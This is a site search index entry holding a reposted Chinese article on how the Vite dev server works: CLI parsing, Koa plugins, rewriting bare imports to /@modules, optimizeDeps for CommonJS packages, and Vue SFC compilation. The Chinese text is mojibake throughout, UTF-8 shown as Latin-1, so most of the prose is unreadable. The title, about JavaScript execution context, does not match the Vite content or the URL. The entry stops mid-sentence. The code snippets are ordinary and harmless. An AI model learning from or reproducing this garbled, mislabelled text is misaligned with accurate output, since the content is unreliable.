<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[æ·±å…¥ç†è§£JSæ‰§è¡Œä¸Šä¸‹æ–‡çš„ç‚¹ç‚¹æ»´æ»´]]></title>
    <url>%2F2020%2F08%2F26%2FWeb%E5%89%8D%E7%AB%AF%2F%E6%B7%B1%E5%85%A5%20vite%20%E5%8E%9F%E7%90%86%EF%BC%9A%E5%B0%A4%E5%A4%A7%E6%9C%80%E6%96%B0%E5%8A%9B%E4%BD%9C%E5%88%B0%E5%BA%95%E6%98%AF%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%9A%84%3F%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ªç½‘ç»œï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://mp.weixin.qq.com/s/ZviWkdYnmFbekKA0LNz92w NO.1 vite æ˜¯ä»€ä¹ˆ vite â€”â€” ä¸€ä¸ªç”± vue ä½œè€…å°¤é›¨æºªå¼€å‘çš„ web å¼€å‘å·¥å…·ï¼Œå®ƒå…·æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š å¿«é€Ÿçš„å†·å¯åŠ¨ å³æ—¶çš„æ¨¡å—çƒ­æ›´æ–° çœŸæ­£çš„æŒ‰éœ€ç¼–è¯‘ ä»ä½œè€…åœ¨å¾®åšä¸Šçš„å‘è¨€ï¼š Viteï¼Œä¸€ä¸ªåŸºäºæµè§ˆå™¨åŸç”Ÿ ES imports çš„å¼€å‘æœåŠ¡å™¨ã€‚åˆ©ç”¨æµè§ˆå™¨å»è§£æ importsï¼Œåœ¨æœåŠ¡å™¨ç«¯æŒ‰éœ€ç¼–è¯‘è¿”å›ï¼Œå®Œå…¨è·³è¿‡äº†æ‰“åŒ…è¿™ä¸ªæ¦‚å¿µï¼ŒæœåŠ¡å™¨éšèµ·éšç”¨ã€‚åŒæ—¶ä¸ä»…æœ‰ Vue æ–‡ä»¶æ”¯æŒï¼Œè¿˜æå®šäº†çƒ­æ›´æ–°ï¼Œè€Œä¸”çƒ­æ›´æ–°çš„é€Ÿåº¦ä¸ä¼šéšç€æ¨¡å—å¢å¤šè€Œå˜æ…¢ã€‚é’ˆå¯¹ç”Ÿäº§ç¯å¢ƒåˆ™å¯ä»¥æŠŠåŒä¸€ä»½ä»£ç ç”¨ rollup æ‰“ã€‚è™½ç„¶ç°åœ¨è¿˜æ¯”è¾ƒç²—ç³™ï¼Œä½†è¿™ä¸ªæ–¹å‘æˆ‘è§‰å¾—æ˜¯æœ‰æ½œåŠ›çš„ï¼Œåšå¾—å¥½å¯ä»¥å½»åº•è§£å†³æ”¹ä¸€è¡Œä»£ç ç­‰åŠå¤©çƒ­æ›´æ–°çš„é—®é¢˜ã€‚ ä¸­å¯ä»¥çœ‹å‡º vite ä¸»è¦ç‰¹ç‚¹æ˜¯åŸºäºæµè§ˆå™¨ native çš„ ES module (https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/import) æ¥å¼€å‘ï¼Œçœç•¥æ‰“åŒ…è¿™ä¸ªæ­¥éª¤ï¼Œå› ä¸ºéœ€è¦ä»€ä¹ˆèµ„æºç›´æ¥åœ¨æµè§ˆå™¨é‡Œå¼•å…¥å³å¯ã€‚ åŸºäºæµè§ˆå™¨ ES module æ¥å¼€å‘ web åº”ç”¨ä¹Ÿä¸æ˜¯ä»€ä¹ˆæ–°é²œäº‹ï¼Œsnowpack ä¹ŸåŸºäºæ­¤ï¼Œä¸è¿‡ç›®å‰æ­¤é¡¹ç›®ç¤¾åŒºä¸­å¹¶æ²¡æœ‰æµè¡Œèµ·æ¥ï¼Œvite çš„å‡ºç°ä¹Ÿè®¸ä¼šè®©è¿™ç§å¼€å‘æ–¹å¼å†ç«ä¸€é˜µå­ã€‚ æœ‰è¶£çš„æ˜¯ vite ç®—æ˜¯é©äº† webpack çš„å‘½äº†ï¼ˆç”Ÿäº§ç¯å¢ƒç”¨ rollupï¼‰ï¼Œæ‰€ä»¥ webpack çš„å¼€å‘è€…ç›´æ¥å–Šå¤§å“¥äº†â€¦ ä½œè€…æ³¨ï¼šæœ¬æ–‡å®Œæˆäº vite æ—©æœŸæ—¶å€™ï¼Œvite éƒ¨åˆ†åŠŸèƒ½å’ŒåŸç†æœ‰æ›´æ–°ã€‚ NO.2 vite çš„ä½¿ç”¨æ–¹å¼ åŒå¸¸è§çš„å¼€å‘å·¥å…·ä¸€æ ·ï¼Œvite æä¾›äº†ç”¨ npm æˆ–è€… yarn ä¸€å»ºç”Ÿæˆé¡¹ç›®ç»“æ„çš„æ–¹å¼ï¼Œä½¿ç”¨ yarn åœ¨ç»ˆç«¯æ‰§è¡Œï¼š 1234$ yarn create vite-app &lt;project-name&gt;$ cd &lt;project-name&gt;$ yarn$ yarn dev å³å¯åˆå§‹åŒ–ä¸€ä¸ª vite é¡¹ç›®ï¼ˆé»˜è®¤åº”ç”¨æ¨¡æ¿ä¸º vue3.xï¼‰ï¼Œç”Ÿæˆçš„é¡¹ç›®ç»“æ„ååˆ†ç®€æ´ï¼š 12345|____node_modules|____App.vue // åº”ç”¨å…¥å£|____index.html // é¡µé¢å…¥å£|____vite.config.js // é…ç½®æ–‡ä»¶|____package.json æ‰§è¡Œ yarn dev å³å¯å¯åŠ¨åº”ç”¨ ã€‚ NO.3 vite å¯åŠ¨é“¾è·¯ å‘½ä»¤è§£æ è¿™éƒ¨åˆ†ä»£ç åœ¨ src/node/cli.ts é‡Œï¼Œä¸»è¦å†…å®¹æ˜¯å€ŸåŠ© minimist â€”â€” ä¸€ä¸ªè½»é‡çº§çš„å‘½ä»¤è§£æå·¥å…·è§£æ npm scriptsï¼Œè§£æçš„å‡½æ•°æ˜¯ resolveOptions ï¼Œç²¾ç®€åçš„ä»£ç ç‰‡æ®µå¦‚ä¸‹ã€‚ 1234567function resolveOptions() &#123; // command å¯ä»¥æ˜¯ dev/build/optimize if (argv._[0]) &#123; argv.command = argv._[0]; &#125; return argv;&#125; æ‹¿åˆ° options åï¼Œä¼šæ ¹æ® options.command çš„å€¼åˆ¤æ–­æ˜¯æ‰§è¡Œåœ¨å¼€å‘ç¯å¢ƒéœ€è¦çš„ runServe å‘½ä»¤æˆ–ç”Ÿäº§ç¯å¢ƒéœ€è¦çš„ runBuild å‘½ä»¤ã€‚ 1234567if (!options.command || options.command === &apos;serve&apos;) &#123; runServe(options) &#125; else if (options.command === &apos;build&apos;) &#123; runBuild(options) &#125; else if (options.command === &apos;optimize&apos;) &#123; runOptimize(options) &#125; åœ¨ runServe æ–¹æ³•ä¸­ï¼Œæ‰§è¡Œ server æ¨¡å—çš„åˆ›å»ºå¼€å‘æœåŠ¡å™¨æ–¹æ³•ï¼ŒåŒæ ·åœ¨ runBuild ä¸­æ‰§è¡Œ build æ¨¡å—çš„æ„å»ºæ–¹æ³•ã€‚ æœ€æ–°çš„ç‰ˆæœ¬ä¸­è¿˜å¢åŠ äº† optimize å‘½ä»¤çš„æ”¯æŒï¼Œå…³äº optimize åšäº†ä»€ä¹ˆï¼Œæˆ‘ä»¬ä¸‹æ–‡å†è¯´ã€‚ server è¿™éƒ¨åˆ†ä»£ç åœ¨ src/node/server/index.ts é‡Œï¼Œä¸»è¦æš´éœ²ä¸€ä¸ª createServer æ–¹æ³•ã€‚ vite ä½¿ç”¨ koa ä½œ web serverï¼Œä½¿ç”¨ clmloader åˆ›å»ºäº†ä¸€ä¸ªç›‘å¬æ–‡ä»¶æ”¹åŠ¨çš„ watcherï¼ŒåŒæ—¶å®ç°äº†ä¸€ä¸ªæ’ä»¶æœºåˆ¶ï¼Œå°† koa-app å’Œ watcher ä»¥åŠå…¶ä»–å¿…è¦å·¥å…·ç»„åˆæˆä¸€ä¸ª context å¯¹è±¡æ³¨å…¥åˆ°æ¯ä¸ª plugin ä¸­ã€‚ context ç»„æˆå¦‚ä¸‹ï¼š plugin ä¾æ¬¡ä» context é‡Œè·å–ä¸Šé¢è¿™äº›ç»„æˆéƒ¨åˆ†ï¼Œæœ‰çš„ plugin åœ¨ koa å®ä¾‹æ·»åŠ äº†å‡ ä¸ª middlewareï¼Œæœ‰çš„å€ŸåŠ© watcher å®ç°å¯¹æ–‡ä»¶çš„æ”¹åŠ¨ç›‘å¬ï¼Œè¿™ç§æ’ä»¶æœºåˆ¶å¸¦æ¥çš„å¥½å¤„æ˜¯æ•´ä¸ªåº”ç”¨ç»“æ„æ¸…æ™°ï¼ŒåŒæ—¶æ¯ä¸ªæ’ä»¶å¤„ç†ä¸åŒçš„äº‹æƒ…ï¼ŒèŒè´£æ›´åˆ†æ˜ï¼Œ plugin ä¸Šæ–‡æˆ‘ä»¬è¯´åˆ° pluginï¼Œé‚£ä¹ˆæœ‰å“ªäº› plugin å‘¢ï¼Ÿå®ƒä»¬åˆ†åˆ«æ˜¯ï¼š ç”¨æˆ·æ³¨å…¥çš„ plugins â€”â€” è‡ªå®šä¹‰ plugin hmrPlugin â€”â€” å¤„ç† hmr htmlRewritePlugin â€”â€” é‡å†™ html å†…çš„ script å†…å®¹ moduleRewritePlugin â€”â€” é‡å†™æ¨¡å—ä¸­çš„ import å¯¼å…¥ moduleResolvePlugin â€”â€”è·å–æ¨¡å—å†…å®¹ vuePlugin â€”â€” å¤„ç† vue å•æ–‡ä»¶ç»„ä»¶ esbuildPlugin â€”â€” ä½¿ç”¨ esbuild å¤„ç†èµ„æº assetPathPlugin â€”â€” å¤„ç†é™æ€èµ„æº serveStaticPlugin â€”â€” æ‰˜ç®¡é™æ€èµ„æº cssPlugin â€”â€” å¤„ç† css/less/sass ç­‰å¼•ç”¨ â€¦ æˆ‘ä»¬æ¥çœ‹ plugin çš„å®ç°æ–¹å¼ï¼Œå¼€å‘ä¸€ä¸ªç”¨æ¥æ‹¦æˆª json æ–‡ä»¶ plugin å¯ä»¥è¿™ä¹ˆå®ç°ï¼š 1234567891011121314151617181920interface ServerPluginContext &#123; root: string app: Koa server: Server watcher: HMRWatcher resolver: InternalResolver config: ServerConfig&#125;type ServerPlugin = ï¼ˆctx:ServerPluginContextï¼‰=&gt; void;const JsonInterceptPlugin:ServerPlugin = (&#123;app&#125;)=&gt;&#123; app.use(async (ctx, next) =&gt; &#123; await next() if (ctx.path.endsWith(&apos;.json&apos;) &amp;&amp; ctx.body) &#123; ctx.type = &apos;js&apos; ctx.body = `export default json` &#125; &#125;)&#125; vite èƒŒåçš„åŸç†éƒ½åœ¨ plugin é‡Œï¼Œè¿™é‡Œä¸å†ä¸€ä¸€è§£é‡Šæ¯ä¸ª plugin çš„ä½œç”¨ï¼Œä¼šæ”¾åœ¨ä¸‹æ–‡èƒŒåçš„åŸç†ä¸­ä¸€å¹¶è®¨è®ºã€‚ build è¿™éƒ¨åˆ†ä»£ç åœ¨ node/build/index.ts ä¸­ï¼Œbuild ç›®å½•çš„ç»“æ„è™½ç„¶ä¸ server ç›¸ä¼¼ï¼ŒåŒæ ·å¯¼å‡ºä¸€ä¸ª build æ–¹æ³•ï¼ŒåŒæ ·ä¹Ÿæœ‰è®¸å¤š pluginï¼Œä¸è¿‡è¿™äº› plugin ä¸ server ä¸­çš„ç”¨é€”ä¸ä¸€æ ·ï¼Œå› ä¸º build ä½¿ç”¨äº† rollup ï¼Œæ‰€ä»¥è¿™äº› plugin ä¹Ÿæ˜¯ä¸º rollup æ‰“åŒ…çš„ plugin ï¼Œæœ¬æ–‡å°±ä¸å†å¤šæã€‚ NO.4 vite è¿è¡ŒåŸç† ES module è¦äº†è§£ vite çš„è¿è¡ŒåŸç†ï¼Œé¦–å…ˆè¦çŸ¥é“ä»€ä¹ˆæ˜¯ ES moduleï¼Œç›®å‰æµè§ˆå™¨å¯¹å…¶çš„æ”¯æŒå¦‚ä¸‹ï¼š ä¸»æµçš„æµè§ˆå™¨ï¼ˆIE11é™¤å¤–ï¼‰å‡å·²ç»æ”¯æŒï¼Œå…¶æœ€å¤§çš„ç‰¹ç‚¹æ˜¯åœ¨æµè§ˆå™¨ç«¯ä½¿ç”¨ export import çš„æ–¹å¼å¯¼å…¥å’Œå¯¼å‡ºæ¨¡å—ï¼Œåœ¨ script æ ‡ç­¾é‡Œè®¾ç½® type=&quot;module&quot; ï¼Œç„¶åä½¿ç”¨æ¨¡å—å†…å®¹ã€‚ 123&lt;script type=&quot;module&quot;&gt; import &#123; bar &#125; from &apos;./bar.jsâ€˜&lt;/script&gt; å½“ html é‡ŒåµŒå…¥ä¸Šé¢çš„ script æ ‡ç­¾æ—¶å€™ï¼Œæµè§ˆå™¨ä¼šå‘èµ· http è¯·æ±‚ï¼Œè¯·æ±‚ htttp server æ‰˜ç®¡çš„ bar.js ï¼Œåœ¨ bar.js é‡Œï¼Œæˆ‘ä»¬ç”¨ named export å¯¼å‡º bar å˜é‡ï¼Œåœ¨ä¸Šé¢çš„ script ä¸­èƒ½è·å–åˆ° bar çš„å®šä¹‰ã€‚ 12// bar.js export const bar = &apos;bar&apos;; åœ¨ vite ä¸­çš„ä½œç”¨ æ‰“å¼€è¿è¡Œä¸­çš„ vite é¡¹ç›®ï¼Œè®¿é—® view-source å¯ä»¥å‘ç° html é‡Œæœ‰æ®µè¿™æ ·çš„ä»£ç ï¼š 12345&lt;script type=&quot;module&quot;&gt; import &#123; createApp &#125; from &apos;/@modules/vue&apos; import App from &apos;/App.vue&apos; createApp(App).mount(&apos;#app&apos;)&lt;/script&gt; ä»è¿™æ®µä»£ç ä¸­ï¼Œæˆ‘ä»¬èƒ½ get åˆ°ä»¥ä¸‹å‡ ç‚¹ä¿¡æ¯ï¼š ä» http://localhost:3000/@modules/vue ä¸­è·å– createApp è¿™ä¸ªæ–¹æ³• ä» http://localhost:3000/App.vue ä¸­è·å–åº”ç”¨å…¥å£ ä½¿ç”¨ createApp åˆ›å»ºåº”ç”¨å¹¶æŒ‚è½½èŠ‚ç‚¹ createApp æ˜¯ vue3.X çš„ apiï¼Œåªéœ€çŸ¥é“è¿™æ˜¯åˆ›å»ºäº† vue åº”ç”¨å³å¯ï¼Œvite åˆ©ç”¨ ES moduleï¼ŒæŠŠ â€œæ„å»º vue åº”ç”¨â€ è¿™ä¸ªæœ¬æ¥éœ€è¦é€šè¿‡ webpack æ‰“åŒ…åæ‰èƒ½æ‰§è¡Œçš„ä»£ç ç›´æ¥æ”¾åœ¨æµè§ˆå™¨é‡Œæ‰§è¡Œï¼Œè¿™ä¹ˆåšæ˜¯ä¸ºäº†ï¼š å»æ‰æ‰“åŒ…æ­¥éª¤ å®ç°æŒ‰éœ€åŠ è½½ å»æ‰æ‰“åŒ…æ­¥éª¤æ‰“åŒ…çš„æ¦‚å¿µæ˜¯å¼€å‘è€…åˆ©ç”¨æ‰“åŒ…å·¥å…·å°†åº”ç”¨å„ä¸ªæ¨¡å—é›†åˆåœ¨ä¸€èµ·å½¢æˆ bundleï¼Œä»¥ä¸€å®šè§„åˆ™è¯»å–æ¨¡å—çš„ä»£ç â€”â€”ä»¥ä¾¿åœ¨ä¸æ”¯æŒæ¨¡å—åŒ–çš„æµè§ˆå™¨é‡Œä½¿ç”¨ã€‚ ä¸ºäº†åœ¨æµè§ˆå™¨é‡ŒåŠ è½½å„æ¨¡å—ï¼Œæ‰“åŒ…å·¥å…·ä¼šå€ŸåŠ©èƒ¶æ°´ä»£ç ç”¨æ¥ç»„è£…å„æ¨¡å—ï¼Œæ¯”å¦‚ webpack ä½¿ç”¨ map å­˜æ”¾æ¨¡å— id å’Œè·¯å¾„ï¼Œä½¿ç”¨ __webpack_require__ æ–¹æ³•è·å–æ¨¡å—å¯¼å‡ºã€‚ vite åˆ©ç”¨æµè§ˆå™¨åŸç”Ÿæ”¯æŒæ¨¡å—åŒ–å¯¼å…¥è¿™ä¸€ç‰¹æ€§ï¼Œçœç•¥äº†å¯¹æ¨¡å—çš„ç»„è£…ï¼Œä¹Ÿå°±ä¸éœ€è¦ç”Ÿæˆ bundleï¼Œæ‰€ä»¥æ‰“åŒ…è¿™ä¸€æ­¥å°±å¯ä»¥çœç•¥äº†ã€‚ å®ç°æŒ‰éœ€æ‰“åŒ…å‰é¢è¯´åˆ°ï¼Œwebpack ä¹‹ç±»çš„æ‰“åŒ…å·¥å…·ä¼šå°†å„æ¨¡å—æå‰æ‰“åŒ…è¿› bundle é‡Œï¼Œä½†æ‰“åŒ…çš„è¿‡ç¨‹æ˜¯é™æ€çš„â€”â€”ä¸ç®¡æŸä¸ªæ¨¡å—çš„ä»£ç æ˜¯å¦æ‰§è¡Œåˆ°ï¼Œè¿™ä¸ªæ¨¡å—éƒ½è¦æ‰“åŒ…åˆ° bundle é‡Œï¼Œè¿™æ ·çš„åå¤„å°±æ˜¯éšç€é¡¹ç›®è¶Šæ¥è¶Šå¤§æ‰“åŒ…åçš„ bundle ä¹Ÿè¶Šæ¥è¶Šå¤§ã€‚ å¼€å‘è€…ä¸ºäº†å‡å°‘ bundle å¤§å°ï¼Œä¼šä½¿ç”¨åŠ¨æ€å¼•å…¥ import() çš„æ–¹å¼å¼‚æ­¥çš„åŠ è½½æ¨¡å—ï¼ˆ è¢«å¼•å…¥æ¨¡å—ä¾ç„¶éœ€è¦æå‰æ‰“åŒ…)ï¼Œåˆæˆ–è€…ä½¿ç”¨ tree shaking ç­‰æ–¹å¼å°½åŠ›çš„å»æ‰æœªå¼•ç”¨çš„æ¨¡å—ï¼Œç„¶è€Œè¿™äº›æ–¹å¼éƒ½ä¸å¦‚ vite çš„ä¼˜é›…ï¼Œvite å¯ä»¥åªåœ¨éœ€è¦æŸä¸ªæ¨¡å—çš„æ—¶å€™åŠ¨æ€ï¼ˆå€ŸåŠ© import() ï¼‰çš„å¼•å…¥å®ƒï¼Œè€Œä¸éœ€è¦æå‰æ‰“åŒ…ï¼Œè™½ç„¶åªèƒ½ç”¨åœ¨å¼€å‘ç¯å¢ƒï¼Œä¸è¿‡è¿™å°±å¤Ÿäº†ã€‚ vite å¦‚ä½•å¤„ç† ESM æ—¢ç„¶ vite ä½¿ç”¨ ESM åœ¨æµè§ˆå™¨é‡Œä½¿ç”¨æ¨¡å—ï¼Œé‚£ä¹ˆè¿™ä¸€æ­¥ç©¶ç«Ÿæ˜¯æ€ä¹ˆåšçš„ï¼Ÿ ä¸Šæ–‡æåˆ°è¿‡ï¼Œåœ¨æµè§ˆå™¨é‡Œä½¿ç”¨ ES module æ˜¯ä½¿ç”¨ http è¯·æ±‚æ‹¿åˆ°æ¨¡å—ï¼Œæ‰€ä»¥ vite å¿…é¡»æä¾›ä¸€ä¸ª web server å»ä»£ç†è¿™äº›æ¨¡å—ï¼Œä¸Šæ–‡ä¸­æåˆ°çš„ koa å°±æ˜¯è´Ÿè´£è¿™ä¸ªäº‹æƒ…ï¼Œvite é€šè¿‡å¯¹è¯·æ±‚è·¯å¾„çš„åŠ«æŒè·å–èµ„æºçš„å†…å®¹è¿”å›ç»™æµè§ˆå™¨ï¼Œä¸è¿‡ vite å¯¹äºæ¨¡å—å¯¼å…¥åšäº†ç‰¹æ®Šå¤„ç†ã€‚ @modules æ˜¯ä»€ä¹ˆï¼Ÿé€šè¿‡å·¥ç¨‹ä¸‹çš„ index.html å’Œå¼€å‘ç¯å¢ƒä¸‹çš„ html æºæ–‡ä»¶å¯¹æ¯”ï¼Œå‘ç° script æ ‡ç­¾é‡Œçš„å†…å®¹å‘ç”Ÿäº†æ”¹å˜ï¼Œç”± 12345&lt;script type=&quot;module&quot;&gt; import &#123; createApp &#125; from &apos;vue&apos; import App from &apos;/App.vue&apos; createApp(App).mount(&apos;#app&apos;)&lt;/script&gt; å˜æˆäº† 123456&lt;script type=&quot;module&quot;&gt; import &#123; createApp &#125; from &apos;/@modules/vue&apos; import App from &apos;/App.vue&apos; createApp(App).mount(&apos;#app&apos;)&lt;/script&gt;vite å¯¹ import éƒ½åšäº†ä¸€å±‚å¤„ç†ï¼Œå…¶è¿‡ç¨‹å¦‚ä¸‹ï¼š åœ¨ koa ä¸­é—´ä»¶é‡Œè·å–è¯·æ±‚ body é€šè¿‡ es-module-lexer è§£æèµ„æº ast æ‹¿åˆ° import çš„å†…å®¹ åˆ¤æ–­ import çš„èµ„æºæ˜¯å¦æ˜¯ç»å¯¹è·¯å¾„ï¼Œç»å¯¹è§†ä¸º npm æ¨¡å— è¿”å›å¤„ç†åçš„èµ„æºè·¯å¾„ï¼š&quot;vue&quot; =&gt; &quot;/@modules/vue&quot; è¿™éƒ¨åˆ†ä»£ç åœ¨ serverPluginModuleRewrite è¿™ä¸ª plugin ä¸­ï¼Œ ä¸ºä»€ä¹ˆéœ€è¦ @modulesï¼Ÿ**** å¦‚æœæˆ‘ä»¬åœ¨æ¨¡å—é‡Œå†™ä¸‹ä»¥ä¸‹ä»£ç çš„æ—¶å€™ï¼Œæµè§ˆå™¨ä¸­çš„ esm æ˜¯ä¸å¯èƒ½è·å–åˆ°å¯¼å…¥çš„æ¨¡å—å†…å®¹çš„ï¼š 1import vue from &apos;vue&apos; å› ä¸º vue è¿™ä¸ªæ¨¡å—å®‰è£…åœ¨ node_modules é‡Œï¼Œä»¥å¾€ä½¿ç”¨ webpackï¼Œwebpacké‡åˆ°ä¸Šé¢çš„ä»£ç ï¼Œä¼šå¸®æˆ‘ä»¬åšä»¥ä¸‹å‡ ä»¶äº‹ï¼š è·å–è¿™æ®µä»£ç çš„å†…å®¹ è§£ææˆ AST éå† AST æ‹¿åˆ° import è¯­å¥ä¸­çš„åŒ…çš„åç§° ä½¿ç”¨ enhanced-resolve æ‹¿åˆ°åŒ…çš„å®é™…åœ°å€è¿›è¡Œæ‰“åŒ…ï¼Œ ä½†æ˜¯æµè§ˆå™¨ä¸­ ESM æ— æ³•ç›´æ¥è®¿é—®é¡¹ç›®ä¸‹çš„ node_modulesï¼Œæ‰€ä»¥ vite å¯¹æ‰€æœ‰ import éƒ½åšäº†å¤„ç†ï¼Œç”¨å¸¦æœ‰ @modules çš„å‰ç¼€é‡å†™å®ƒä»¬ã€‚ ä»å¦å¤–ä¸€ä¸ªè§’åº¦æ¥çœ‹è¿™æ˜¯éå¸¸æ¯”è¾ƒå·§å¦™çš„åšæ³•ï¼ŒæŠŠæ–‡ä»¶è·¯å¾„çš„ rewrite éƒ½å†™åœ¨åŒä¸€ä¸ª plugin é‡Œï¼Œè¿™æ ·åç»­å¦‚æœåŠ å…¥æ›´å¤šé€»è¾‘ï¼Œæ”¹åŠ¨èµ·æ¥ä¸ä¼šå½±å“å…¶ä»– pluginï¼Œå…¶ä»– plugin æ‹¿åˆ°èµ„æºè·¯å¾„éƒ½æ˜¯ @modules ï¼Œæ¯”å¦‚è¯´åç»­å¯èƒ½åŠ å…¥ alias çš„é…ç½®ï¼šå°±åƒ webpack alias ä¸€æ ·ï¼šå¯ä»¥å°†é¡¹ç›®é‡Œçš„æœ¬åœ°æ–‡ä»¶é…ç½®æˆç»å¯¹è·¯å¾„çš„å¼•ç”¨ã€‚ æ€ä¹ˆè¿”å›æ¨¡å—å†…å®¹**** åœ¨ä¸‹ä¸€ä¸ª koa middleware ä¸­ï¼Œç”¨æ­£åˆ™åŒ¹é…åˆ°è·¯å¾„ä¸Šå¸¦æœ‰ @modules çš„èµ„æºï¼Œå†é€šè¿‡ require(&#39;xxx&#39;) æ‹¿åˆ° åŒ…çš„å¯¼å‡ºè¿”å›ç»™æµè§ˆå™¨ã€‚ ä»¥å¾€ä½¿ç”¨ webpack ä¹‹ç±»çš„æ‰“åŒ…å·¥å…·ï¼Œå®ƒä»¬é™¤äº†å°†æ¨¡å—ç»„è£…åˆ°ä¸€èµ·å½¢æˆ bundleï¼Œè¿˜å¯ä»¥è®©ä½¿ç”¨äº†ä¸åŒæ¨¡å—è§„èŒƒçš„åŒ…äº’ç›¸å¼•ç”¨ï¼Œæ¯”å¦‚ï¼š ES module (esm) å¯¼å…¥ cjs CommonJS (cjs) å¯¼å…¥ esm dynamic import å¯¼å…¥ esm dynamic import å¯¼å…¥ cjs å…³äº es module çš„å‘å¯ä»¥çœ‹è¿™ç¯‡æ–‡ç« (https://zhuanlan.zhihu.com/p/40733281)ã€‚ èµ·åˆåœ¨ vite è¿˜åªæ˜¯ä¸º vue3.x è®¾è®¡çš„æ—¶å€™ï¼Œå¯¹ vue esm åŒ…æ˜¯ç»è¿‡ç‰¹æ®Šå¤„ç†çš„ï¼Œæ¯”å¦‚ï¼šéœ€è¦ @vue/runtime-dom è¿™ä¸ªåŒ…çš„å†…å®¹ï¼Œä¸èƒ½ç›´æ¥é€šè¿‡ require(&#39;``@vue/runtime-dom&#39;ï¼‰å¾—åˆ°ï¼Œè€Œéœ€è¦é€šè¿‡ require(&#39;@vue/runtime-dom/dist/runtime-dom.esm-bundler.js&#39; çš„æ–¹å¼ï¼Œè¿™æ ·å¯ä»¥ä½¿å¾— vite æ‹¿åˆ°ç¬¦åˆ esm æ¨¡å—æ ‡å‡†çš„ vue åŒ…ã€‚ ç›®å‰ç¤¾åŒºä¸­å¤§éƒ¨åˆ†æ¨¡å—éƒ½æ²¡æœ‰è®¾ç½®é»˜è®¤å¯¼å‡º esmï¼Œè€Œæ˜¯å¯¼å‡ºäº† cjs çš„åŒ…ï¼Œæ—¢ç„¶ vue3.0 éœ€è¦é¢å¤–å¤„ç†æ‰èƒ½æ‹¿åˆ° esm çš„åŒ…å†…å®¹ï¼Œé‚£ä¹ˆå…¶ä»–æ—¥å¸¸ä½¿ç”¨çš„ npm åŒ…æ˜¯ä¸æ˜¯ä¹ŸåŒæ ·éœ€è¦æ”¯æŒï¼Ÿç­”æ¡ˆæ˜¯è‚¯å®šçš„ï¼Œç›®å‰åœ¨ vite é¡¹ç›®é‡Œç›´æ¥ä½¿ç”¨ lodash è¿˜æ˜¯ä¼šæŠ¥é”™çš„ã€‚ ä¸è¿‡ vite åœ¨æœ€è¿‘çš„æ›´æ–°ä¸­ï¼ŒåŠ å…¥äº† optimize å‘½ä»¤ï¼Œè¿™ä¸ªå‘½ä»¤ä¸“é—¨ä¸ºè§£å†³æ¨¡å—å¼•ç”¨çš„å‘è€Œå¼€å‘ï¼Œä¾‹å¦‚æˆ‘ä»¬è¦åœ¨ vite ä¸­ä½¿ç”¨ lodashï¼Œåªéœ€è¦åœ¨ vite.config.js ï¼ˆvite é…ç½®æ–‡ä»¶ï¼‰ä¸­ï¼Œé…ç½® optimizeDeps å¯¹è±¡ï¼Œåœ¨ include æ•°ç»„ä¸­æ·»åŠ  lodashã€‚ 1234567// vite.config.jsmodule.exports = &#123; optimizeDeps: &#123; include: [&quot;lodash&quot;] &#125;&#125;è¿™æ · vite åœ¨æ‰§è¡Œ runOptimize çš„æ—¶å€™ä¸­ä¼šä½¿ç”¨ roolup å¯¹ lodash åŒ…é‡æ–°ç¼–è¯‘ï¼Œå°†ç¼–è¯‘æˆç¬¦åˆ esm æ¨¡å—è§„èŒƒçš„æ–°çš„åŒ…æ”¾å…¥ node_modules ä¸‹çš„ .vite_opt_cache ä¸­ï¼Œç„¶åé…åˆ resolver å¯¹ lodash çš„å¯¼å…¥è¿›è¡Œå¤„ç†ï¼šä½¿ç”¨ç¼–è¯‘åçš„åŒ…å†…å®¹ä»£æ›¿åŸæ¥ lodash çš„åŒ…çš„å†…å®¹ï¼Œè¿™æ ·å°±è§£å†³äº† vite ä¸­ä¸èƒ½ä½¿ç”¨ cjs åŒ…çš„é—®é¢˜ï¼Œè¿™éƒ¨åˆ†ä»£ç åœ¨ depOptimizer.ts é‡Œã€‚ ä¸è¿‡è¿™é‡Œè¿˜æœ‰ä¸ªé—®é¢˜ï¼Œç”±äºåœ¨ depOptimizer.ts ä¸­ï¼Œvite åªä¼šå¤„ç†åœ¨é¡¹ç›®ä¸‹ package.json é‡Œçš„ dependencies é‡Œå£°æ˜å¥½çš„åŒ…è¿›è¡Œå¤„ç†ï¼Œæ‰€ä»¥æ— æ³•åœ¨é¡¹ç›®é‡Œä½¿ç”¨ 1import pick from &apos;lodash/pick&apos; çš„æ–¹å¼å•ä½¿ç”¨ pick æ–¹æ³•ï¼Œè€Œè¦ä½¿ç”¨ 123import lodash from &apos;lodash&apos;lodash.pick() çš„æ–¹å¼ï¼Œè¿™å¯èƒ½åœ¨ç”Ÿäº§ç¯å¢ƒä¸‹ä½¿ç”¨æŸäº›åŒ…çš„æ—¶å€™å¯¹ bundle çš„ä½“ç§¯æœ‰å½±å“ã€‚ è¿”å›æ¨¡å—çš„å†…å®¹çš„ä»£ç åœ¨ï¼šserverPluginModuleResolve.ts è¿™ä¸ª plugin ä¸­ã€‚ vite å¦‚ä½•ç¼–è¯‘æ¨¡å— æœ€åˆ vite ä¸º vue3.x å¼€å‘ï¼Œæ‰€ä»¥è¿™é‡Œçš„ç¼–è¯‘æŒ‡çš„æ˜¯ç¼–è¯‘ vue å•æ–‡ä»¶ç»„ä»¶ï¼Œå…¶ä»– es æ¨¡å—å¯ä»¥ç›´æ¥å¯¼å…¥å†…å®¹ã€‚ SFC**** vue å•æ–‡ä»¶ç»„ä»¶ï¼ˆç®€ç§° SFCï¼‰ æ˜¯ vue çš„ä¸€ä¸ªäº®ç‚¹ï¼Œå‰ç«¯å±Šå¯¹ SFC è¤’è´¬ä¸ä¸€ï¼Œä¸ªäººçœ‹æ¥ï¼ŒSFC æ˜¯åˆ©å¤§äºå¼Šçš„ï¼Œè™½ç„¶ SFC å¸¦æ¥äº†é¢å¤–çš„å¼€å‘å·¥ä½œé‡ï¼Œæ¯”å¦‚ä¸ºäº†è§£æ template è¦å†™æ¨¡æ¿è§£æå™¨ï¼Œè¿˜è¦åœ¨ SFC ä¸­è§£æå‡ºé€»è¾‘å’Œæ ·å¼ï¼Œåœ¨ vscode é‡Œè¦å†™ vscode æ’ä»¶ï¼Œåœ¨ webpack é‡Œè¦å†™ 